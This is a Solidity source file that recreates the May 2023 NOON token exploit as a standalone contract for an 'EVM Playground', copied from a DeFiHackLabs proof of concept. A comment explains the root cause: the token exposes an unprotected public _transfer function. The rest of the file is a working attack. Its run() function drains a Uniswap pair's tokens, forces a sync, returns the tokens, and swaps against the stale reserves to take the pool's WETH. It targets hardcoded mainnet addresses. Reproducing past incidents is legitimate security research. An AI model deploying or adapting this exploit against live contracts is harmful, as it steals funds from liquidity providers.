// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-NOON).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`ContractTest`, attacker = address(this)), so there is no standalone
// contract to deploy. This contract is a faithful, self-contained copy of
// `testTransfer()`'s inline attack so the playground can deploy it and record
// `run()`. Logic and constants are copied verbatim from test/NOON_exp.sol.
//
// Root cause: the NO token exposes its internal balance-moving primitive
// `_transfer(from, to, amount)` as a PUBLIC function with NO access control
// and NO allowance check on `from`. Anyone can move any holder's NO balance —
// including the AMM pair's — for free. The attacker drains the pair's NO,
// `sync()`s to collapse `k`, returns the NO (without re-syncing), then `swap()`s
// against the stale `reserve0 = 1` to extract almost all the WETH.

interface INO {
    function _transfer(address sender, address recipient, uint256 amount) external;
    function transfer(address to, uint256 value) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV2Pair {
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IUniswapV2Router {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        external
        pure
        returns (uint256 amountOut);
}

contract NOONExploit {
    INO private constant NO = INO(0x6fEAc5F3792065b21f85BC118D891b33e0673bD8);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair private constant Pair = IUniswapV2Pair(0x421A5671306CB5f66FF580573C1c8D536E266c93);
    IUniswapV2Router private constant Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private constant FLASHBOTS_BUILDER = 0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5;

    function run() external {
        // 1. Free drain: move (almost) all of the pair's NO to this contract.
        NO._transfer(address(Pair), address(this), NO.balanceOf(address(Pair)) - 1);

        // 2. Force the pair's reserves to the gutted balance: reserve0 = 1 wei.
        Pair.sync();

        // 3. Send the stolen NO back WITHOUT re-syncing — reserve0 stays at 1.
        NO.transfer(address(Pair), NO.balanceOf(address(this)));

        (uint256 noReserve, uint256 wethReserve,) = Pair.getReserves();

        // 4. Builder bribe (mirrors the original attack tx; does not affect profit).
        FLASHBOTS_BUILDER.call{value: 0.000000001 ether}("");

        // 5. Quote the WETH payout against the stale reserve0 = 1.
        uint256 amount1Out = Router.getAmountOut(NO.balanceOf(address(Pair)) - 1, noReserve, wethReserve);

        // 6. Swap: the K-check passes against the stale reserves, paying out the WETH.
        Pair.swap(0, amount1Out, address(this), "");
    }
}
